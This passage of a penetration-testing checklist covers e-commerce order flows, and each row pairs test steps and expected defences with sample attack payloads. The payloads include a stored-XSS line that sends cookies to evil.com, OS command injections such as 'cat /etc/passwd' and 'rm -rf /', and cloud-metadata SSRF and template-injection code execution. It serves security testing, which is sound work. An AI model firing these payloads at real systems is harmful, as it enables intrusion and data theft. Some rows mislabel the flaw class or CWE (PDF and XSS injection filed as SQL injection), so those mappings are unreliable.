| ORD-140 | Prototype Pollution in Order Object | Injection (WSTG-INPV-01) | Place Order | 1. If the application uses JavaScript/Node.js inject prototype pollution payloads in order JSON body. 2. Check for unexpected behavior or privilege escalation. | Application must sanitize incoming JSON objects and prevent prototype pollution attacks. | <code>{"__proto__":{"isAdmin":true}} or {"constructor":{"prototype":{"isAdmin":true}}} in order body</code> | Prototype pollution -&gt; DOM XSS (client) / RCE (server). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Custom Scripts | CWE-1321; -&gt;[Prototype Pollution checklist](#/checklist/prototype); Olivier Arteau; PortSwigger server-side PP |
| ORD-141 | Host Header Injection on Order Confirmation | HTTP Header Injection (WSTG-INPV-17) | Place Order | 1. Place an order and intercept the request. 2. Modify the Host header to a malicious domain. 3. Check if confirmation email or redirect uses the injected host. | Application must not rely on the Host header for generating URLs in emails or responses. | <code>Host: evil.com in POST /api/orders request to check if confirmation email links use evil.com</code> | Host-header injection into this flow -&gt; password-reset poisoning / cache poisoning -&gt; account takeover. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite | CWE-644; -&gt;[Host Header Injection checklist](#/checklist/hostheader); James Kettle Practical Web Cache Poisoning |
| ORD-142 | Clickjacking on Order Confirmation Page | Clickjacking (WSTG-CLNT-09) | Order Confirmation | 1. Create a page that iframes the order confirmation page. 2. Overlay invisible buttons over confirmation actions. 3. Check if the page can be framed. | Application must implement X-Frame-Options: DENY and Content-Security-Policy: frame-ancestors 'none' headers. | <code>&lt;iframe src='https://target.com/order/confirmation/1001' style='opacity:0'&gt;&lt;/iframe&gt;</code> | Clickjacking of a sensitive action -&gt; UI-redress-driven state change. | Medium | 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) | Burp Suite;Browser | CWE-1021; -&gt;[CSRF checklist](#/checklist/csrf); OWASP Clickjacking; PortSwigger |
| ORD-143 | GraphQL Query Abuse on Order History | Injection (WSTG-INPV-01) | Order History | 1. If the application uses GraphQL craft a deeply nested query to extract all order fields. 2. Attempt introspection queries. 3. Check for excessive data exposure. | Application must implement query depth limiting and field-level authorization in GraphQL endpoints. | <code>{orders{id;total;user{id;email;password;creditCards{number;cvv}}}}</code> | GraphQL abuse -&gt; introspection/IDOR/batching DoS -&gt; data exposure or availability. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;GraphQL Voyager;InQL | CWE-400; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP GraphQL Cheat Sheet; PortSwigger |
| ORD-144 | Broken Function Level Authorization on Tracking Update | Broken Access Control (WSTG-AUTHZ-02) | Order Tracking | 1. As a customer attempt to call the tracking update API meant for logistics. 2. Try to modify tracking status or add tracking events. 3. Verify role enforcement. | Application must enforce function-level authorization ensuring only logistics roles can update tracking information. | <code>POST /api/tracking/update with customer credentials body: {tracking_id:TRK-1001;status:delivered}</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-145 | Double Spending via Cancel and Refund Race | Business Logic (WSTG-BUSL-08) | Order Cancellation | 1. Place an order. 2. Simultaneously request cancellation with refund and use a digital product or service from the order. 3. Check if both refund and product access succeed. | Application must atomically handle cancellation and immediately revoke access to any delivered digital goods upon refund. | <code>Concurrent POST /api/orders/cancel and GET /api/orders/1001/download-digital-product</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Turbo Intruder;Custom Scripts | CWE-840; PortSwigger Business logic |
| ORD-146 | Vertical Privilege Escalation via Modification API | Broken Access Control (WSTG-AUTHZ-02) | Order Modification | 1. As regular user access admin-level modification endpoints. 2. Try to bypass restrictions by adding admin parameters. 3. Check for privilege escalation. | Application must enforce role-based access on all modification endpoints regardless of parameters submitted. | <code>PUT /api/admin/orders/modify with regular user token adding admin_override=true</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-147 | Business Logic Bypass Return Without Sending Item | Business Logic (WSTG-BUSL-02) | Return / Exchange Request | 1. Submit a return request and receive refund approval. 2. Never actually ship the return item. 3. Check if refund is processed without return receipt confirmation. | Application must verify physical receipt of returned items before processing refunds. | <code>POST /api/returns/confirm-refund without corresponding return_received=true status</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-148 | Insecure Deserialization in Return Data | Injection (WSTG-INPV-08) | Return / Exchange Request | 1. If the application serializes return request data intercept and inject malicious serialized objects. 2. Submit and observe for RCE or data manipulation. | Application must validate and sanitize all deserialized data and avoid deserializing untrusted input. | <code>Inject serialized Java/PHP/Python object in return request parameters</code> | Insecure deserialization -&gt; remote code execution. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;ysoserial | CWE-502; -&gt;[Insecure Deserialization checklist](#/checklist/deser); Bechler 'Java Unmarshaller Security'; ysoserial |
| ORD-149 | Unauthorized Access to Other Users' Order History via Reorder | Broken Access Control (WSTG-AUTHZ-04) | Reorder / Buy Again | 1. Use the reorder API and manipulate order_id to reference another user's order. 2. Check if the reorder reveals item details from another user's order history. | Application must verify ownership of the referenced order before populating reorder details. | <code>POST /api/reorder with order_id belonging to another user to extract their order items</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-150 | SSRF via Invoice Logo URL | SSRF (WSTG-INPV-19) | Order Invoice / Receipt | 1. If invoice allows custom logo or image URLs intercept the request. 2. Set logo URL to an internal service. 3. Check if server-side request is made. | Application must validate image URLs and prevent SSRF by blocking internal network addresses. | <code>logo_url=http://169.254.169.254/latest/meta-data/ or logo_url=http://internal:8080/admin</code> | SSRF -&gt; internal-service reach / cloud metadata credential theft. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Collaborator | CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger |
| ORD-151 | Delivery Time Slot Injection | Injection (WSTG-INPV-01) | Delivery Scheduling | 1. Select a delivery time slot. 2. Inject invalid or malicious values in the time_slot parameter. 3. Check for error disclosure or unexpected behavior. | Application must validate time slot selections against predefined available slots server-side. | <code>time_slot=9AM-12PM' OR '1'='1 or time_slot=../../etc/passwd</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ORD-152 | Bypassing Gift Wrap Quantity Limits | Business Logic (WSTG-BUSL-01) | Gift Wrapping Options | 1. If there are limits on gift wrapping per order attempt to exceed them via API. 2. Modify gift_wrap_quantity parameter. 3. Check if excess wrapping is added at no cost. | Application must enforce gift wrapping limits and pricing server-side. | <code>Change gift_wrap_quantity=1 to gift_wrap_quantity=999 with same price</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-153 | Vendor Account Takeover via Order API | Broken Access Control (WSTG-AUTHZ-02) | Multi-Vendor Orders | 1. As a customer or competing vendor enumerate vendor order endpoints. 2. Attempt to access vendor management functions. 3. Check for credential or session exposure. | Application must strictly separate vendor authentication and authorization from customer flows. | <code>GET /api/vendor/V002/orders; PUT /api/vendor/V002/settings using V001 or customer credentials</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| ORD-154 | Order Splitting Logic Bypass | Business Logic (WSTG-BUSL-01) | Multi-Vendor Orders | 1. Place a multi-vendor order. 2. Intercept and manipulate the order splitting logic. 3. Try to assign items from Vendor A to Vendor B or combine separate vendor orders. | Application must correctly split orders by vendor server-side and not accept client-directed vendor assignments. | <code>Modify vendor_id assignments in order items to redirect items between vendors</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-155 | Partial Shipment Status Tampering | Business Logic (WSTG-BUSL-02) | Partial Shipment | 1. Intercept partial shipment status update. 2. Change status from shipped to delivered prematurely. 3. Check if the status change triggers early refund or payment release. | Application must validate shipment status transitions and require carrier confirmation before marking delivered. | <code>Change shipment_status=shipped to shipment_status=delivered without carrier confirmation</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-156 | NoSQL Injection in Order Fields | Injection (WSTG-INPV-05) | Place Order | 1. If the backend uses NoSQL database inject NoSQL payloads in order fields. 2. Submit and check for authentication bypass or data extraction. | Application must sanitize all inputs and use parameterized queries even for NoSQL databases. | <code>{"shipping_address":{"$gt":""};"$where":"sleep(5000)"} or {"user_id":{"$ne":null}}</code> | NoSQL operator injection -&gt; authentication bypass / cross-user data disclosure. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;NoSQLMap | CWE-943; -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger NoSQL injection |
| ORD-157 | LDAP Injection in Order Processing | Injection (WSTG-INPV-06) | Place Order | 1. If order processing integrates with LDAP inject LDAP payloads in user-related fields. 2. Observe the response for LDAP errors or bypass. | Application must sanitize all inputs used in LDAP queries and use parameterized LDAP operations. | <code>shipping_name=&#42;)(uid=&#42;))(&#124;(uid=&#42; or customer_name=admin)(&amp;)</code> | LDAP filter injection -&gt; authentication bypass / directory data disclosure. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Custom Scripts | CWE-90; -&gt;[LDAP Injection checklist](#/checklist/ldap); OWASP LDAP Injection; PayloadsAllTheThings |
| ORD-158 | Command Injection in Order Processing | Injection (WSTG-INPV-12) | Place Order | 1. If order fields are processed by server-side commands inject OS command payloads. 2. Check for command execution indicators in the response. | Application must never pass user input directly to OS commands and must use safe APIs. | <code>order_reference=ORD001;cat /etc/passwd or shipping_label=test&#96;whoami&#96;</code> | OS command injection -&gt; remote code execution / server takeover. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Commix | CWE-78; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger OS command injection; GTFOBins |
| ORD-159 | Broken Access Control via API Versioning | Broken Access Control (WSTG-AUTHZ-02) | Order History | 1. Try accessing order history via older API versions. 2. Check if deprecated endpoints lack authorization checks. 3. Try /api/v1/orders vs /api/v2/orders. | Application must enforce consistent authorization checks across all API versions. | <code>GET /api/v1/orders (may lack auth checks); GET /api/v0/orders; GET /api/internal/orders</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;DirBuster | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-160 | Tracking Number Format Validation Bypass | Input Validation (WSTG-INPV-01) | Order Tracking | 1. Submit tracking queries with special characters or excessively long tracking numbers. 2. Check for error messages or unexpected behavior. 3. Test boundary values. | Application must validate tracking number format against expected patterns and handle invalid input gracefully. | <code>tracking_id=&lt;script&gt;alert(1)&lt;/script&gt;; tracking_id=A&#42;10000; tracking_id=null; tracking_id=undefined</code> | Improper input validation -&gt; downstream injection / logic abuse. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet |
| ORD-161 | Cancellation Fee Bypass | Business Logic (WSTG-BUSL-01) | Order Cancellation | 1. If cancellation incurs a fee intercept the cancellation request. 2. Modify cancellation_fee parameter to 0. 3. Check if cancellation processes without fee. | Application must calculate cancellation fees server-side based on business rules and not accept client-provided fee amounts. | <code>Change cancellation_fee=25.00 to cancellation_fee=0.00 in cancellation request</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-162 | Modification After Payment Capture | Business Logic (WSTG-BUSL-02) | Order Modification | 1. After payment is captured attempt to modify order to add items. 2. Check if items are added without additional payment. 3. Verify payment recalculation. | Application must either recapture payment or prevent modification after payment is already captured. | <code>PUT /api/orders/modify adding items after payment_status=captured</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-163 | Return Label Generation SSRF | SSRF (WSTG-INPV-19) | Return / Exchange Request | 1. If return process generates shipping labels and accepts any URL parameters test for SSRF. 2. Point URL to internal services. 3. Check for server-side request. | Application must validate all URLs used in label generation and prevent access to internal resources. | <code>label_callback=http://169.254.169.254/ or return_label_url=http://localhost:9200/_cat/indices</code> | SSRF -&gt; internal-service reach / cloud metadata credential theft. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Collaborator | CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger |
| ORD-164 | Invoice Number Prediction and Fraud | Information Disclosure (WSTG-INFO-04) | Order Invoice / Receipt | 1. Generate multiple invoices and note the numbering pattern. 2. Predict future invoice numbers. 3. Attempt to create or access predicted invoices. | Application must use cryptographically random invoice identifiers that cannot be predicted. | <code>Predict INV-2024-001234 based on pattern INV-2024-001230 through INV-2024-001233</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite Intruder;Custom Scripts | CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ORD-165 | Delivery Fee Manipulation Based on Schedule | Business Logic (WSTG-BUSL-01) | Delivery Scheduling | 1. Select express delivery and intercept request. 2. Change delivery_type to standard but keep express time slot. 3. Check if express delivery is received at standard price. | Application must validate delivery type and scheduling consistency server-side and charge appropriate fees. | <code>Change delivery_type=express to delivery_type=standard while keeping express time_slot</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-166 | Template Injection in Notification Templates | Injection (WSTG-INPV-18) | Order Status Notifications | 1. If notification content uses user data inject template syntax in order fields. 2. Check if template engine processes the injection when notification is generated. | Application must sanitize all dynamic data before inserting into notification templates. | <code>customer_name={{7&#42;7}} or order_note=${Runtime.getRuntime().exec('id')} appearing in notification</code> | Server-side template injection -&gt; remote code execution on the app server. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Tplmap | CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle) |
| ORD-167 | Shipping Method Downgrade While Keeping Price | Business Logic (WSTG-BUSL-01) | Place Order | 1. Select premium shipping and proceed to checkout. 2. Intercept request and change shipping_method to standard. 3. Keep the original total. 4. Check if price is not recalculated. | Application must recalculate totals server-side when shipping method changes. | <code>Change shipping_method=premium to shipping_method=free while total remains unchanged</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-168 | Tax Calculation Bypass | Business Logic (WSTG-BUSL-01) | Place Order | 1. Place an order and intercept the request. 2. Modify tax_amount to 0 or remove tax parameters. 3. Submit and verify if order processes without tax. | Application must calculate taxes server-side based on delivery address and applicable tax rules. | <code>Change tax_amount=8.99 to tax_amount=0.00 or remove tax_amount parameter entirely</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-169 | Address Validation Bypass for Restricted Products | Business Logic (WSTG-BUSL-02) | Place Order | 1. Order a product restricted to certain regions. 2. Use an address outside the permitted region. 3. Bypass frontend validation and submit via API. 4. Check if order is accepted. | Application must validate shipping address restrictions server-side for regulated or restricted products. | <code>Order age-restricted or region-locked product with shipping_address in restricted zone via direct API call</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-170 | Insecure Token in Confirmation URL | Session Management (WSTG-SESS-03) | Order Confirmation | 1. Analyze the order confirmation URL for tokens or identifiers. 2. Check if the token is predictable or reusable. 3. Test if the token expires appropriately. | Application must use cryptographically random tokens in confirmation URLs that expire after first use. | <code>Analyze token entropy in /order/confirm?token=abc123; check if token is sequential or low-entropy</code> | Session fixation/hijack -&gt; attacker rides the victim's authenticated session. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Custom Scripts | CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session management |
| ORD-171 | Export Function Command Injection | Injection (WSTG-INPV-12) | Order History | 1. Use the order history export feature. 2. If filename or format is user-controllable inject OS command payloads. 3. Check for command execution. | Application must sanitize all user input used in file generation and never pass it to OS commands. | <code>export_filename=orders.csv;cat /etc/passwd or format=csv&#124;whoami</code> | OS command injection -&gt; remote code execution / server takeover. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Commix | CWE-78; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger OS command injection; GTFOBins |
| ORD-172 | Tracking Information Disclosure via Referer Header | Information Disclosure (WSTG-INFO-05) | Order Tracking | 1. Visit the order tracking page. 2. Click any external link on the page. 3. Check if the Referer header leaks tracking information to the external site. | Application must set Referrer-Policy: no-referrer on tracking pages to prevent tracking data leakage via Referer header. | <code>Check Referer header after clicking external link on tracking page for tracking_id exposure</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Browser DevTools | CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ORD-173 | Bulk Cancellation API Abuse | Business Logic (WSTG-BUSL-05) | Order Cancellation | 1. If a bulk cancellation API exists test it with a wide range of order IDs including other users' orders. 2. Check if authorization is enforced per-order. | Application must validate ownership of every order in a bulk cancellation request individually. | <code>POST /api/orders/bulk-cancel with order_ids=[1001;1002;1003;1004] including orders from other users</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-174 | HTTP Parameter Pollution on Modification | Input Validation (WSTG-INPV-04) | Order Modification | 1. Send order modification with duplicate parameters. 2. Use both GET and POST with conflicting values. 3. Check which value the server processes. | Application must handle duplicate parameters consistently and reject ambiguous requests. | <code>PUT /api/orders/modify?order_id=1001&amp;order_id=1002 or body: order_id=1001&amp;order_id=1002</code> | Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA |
| ORD-175 | Return Fraud via Quantity Mismatch | Business Logic (WSTG-BUSL-01) | Return / Exchange Request | 1. Order multiple items. 2. Submit return request claiming more items than purchased. 3. Check if excess return quantity is accepted. | Application must validate return quantity against original order quantity and reject excess returns. | <code>Return return_quantity=10 for an item with ordered_quantity=2</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-176 | Reorder Endpoint Authorization Check | Authentication (WSTG-ATHN-01) | Reorder / Buy Again | 1. Access the reorder endpoint. 2. Test with expired tokens or tokens from other users. 3. Verify proper authentication and authorization enforcement. | Application must validate authentication and authorization for all reorder requests. | <code>POST /api/reorder with expired JWT or another user's session token</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;jwt_tool | CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| ORD-177 | HTML to PDF Injection in Invoice | Injection (WSTG-INPV-01) | Order Invoice / Receipt | 1. If invoices are generated as PDF from HTML inject HTML or JavaScript in invoice data fields. 2. Generate the invoice. 3. Check if injection is rendered in PDF. | Application must sanitize all dynamic data before PDF generation and restrict PDF renderer capabilities. | <code>customer_name=&lt;iframe src='http://internal-server/admin'&gt;&lt;/iframe&gt; in invoice generation</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Custom Scripts | CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ORD-178 | Calendar Manipulation for Exclusive Slots | Business Logic (WSTG-BUSL-01) | Delivery Scheduling | 1. Check delivery scheduling calendar. 2. Manipulate date parameters to access hidden or exclusive delivery slots. 3. Book slots not normally available. | Application must validate slot availability server-side and not expose hidden or exclusive slots through parameter manipulation. | <code>Change delivery_slot_id to premium or internal slot IDs not shown in UI</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-179 | Stored XSS via Gift Card Message on Receipt | Cross-Site Scripting (WSTG-INPV-02) | Gift Wrapping Options | 1. Order with gift wrapping and add a message. 2. Include persistent XSS payload in the message. 3. When the recipient views the gift receipt check for execution. | Application must sanitize gift messages on both input and output to prevent stored XSS across user contexts. | <code>gift_card_message=Enjoy! &lt;script&gt;new Image().src='https://evil.com/steal?c='+document.cookie&lt;/script&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53 |
| ORD-180 | Vendor Payment Redirect Manipulation | Business Logic (WSTG-BUSL-01) | Multi-Vendor Orders | 1. In multi-vendor setup intercept vendor payout or settlement requests. 2. Modify vendor bank details or payout destination. 3. Check if manipulation is accepted. | Application must verify vendor identity before processing payouts and require re-authentication for payment detail changes. | <code>Change vendor_bank_account in payout request to attacker-controlled account</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-181 | Partial Delivery Confirmation Spoofing | Business Logic (WSTG-BUSL-02) | Partial Shipment | 1. Attempt to confirm delivery of a partial shipment without valid carrier confirmation. 2. Spoof delivery confirmation via API. 3. Check if payment is released. | Application must verify delivery confirmation with carrier systems before triggering payment release. | <code>POST /api/shipments/SHIP-1001/confirm-delivery with spoofed carrier_confirmation=true</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-182 | Notification Preference Injection | Injection (WSTG-INPV-01) | Order Status Notifications | 1. Update notification preferences. 2. Inject payloads in preference fields like notification_email or phone. 3. Check for injection vulnerabilities. | Application must validate and sanitize all notification preference inputs including email and phone fields. | <code>notification_email=test@test.com&lt;script&gt;alert(1)&lt;/script&gt; or notification_phone=+1234567890;rm -rf /</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ORD-183 | Weak Idempotency Key Implementation | Business Logic (WSTG-BUSL-08) | Place Order | 1. Place an order with an idempotency key. 2. Modify the order details but keep the same idempotency key. 3. Check if the new modified order is processed. | Application must properly implement idempotency by rejecting requests with reused keys regardless of modified content. | <code>Reuse Idempotency-Key: key123 with different order content in POST /api/orders</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-184 | Inventory Reservation Abuse | Business Logic (WSTG-BUSL-05) | Place Order | 1. Add items to cart and proceed to checkout without completing order. 2. Repeat to reserve all inventory. 3. Check if other users are blocked from purchasing. | Application must implement reservation timeouts and limit the number of concurrent reservations per user. | <code>Repeatedly start checkout for limited-stock items without completing to block inventory</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Custom Scripts;Burp Suite | CWE-840; PortSwigger Business logic |
| ORD-185 | Confirmation Bypass to Skip Payment | Business Logic (WSTG-BUSL-02) | Order Confirmation | 1. Intercept the order flow between payment and confirmation. 2. Skip the payment step and directly call the confirmation endpoint. 3. Check if order is confirmed without payment. | Application must verify payment completion server-side before generating order confirmation. | <code>Directly call POST /api/orders/confirm without completing POST /api/payments/process</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-186 | Sensitive Data in Client-Side Storage | Information Disclosure (WSTG-CLNT-11) | Order History | 1. After viewing order history inspect browser localStorage and sessionStorage. 2. Check for cached sensitive order data. 3. Verify data is cleared on logout. | Application must not store sensitive order data in client-side storage or must encrypt and clear it properly. | <code>Check localStorage for keys like orderHistory; recentOrders; cachedOrderData containing sensitive info</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Browser DevTools;Burp Suite | CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
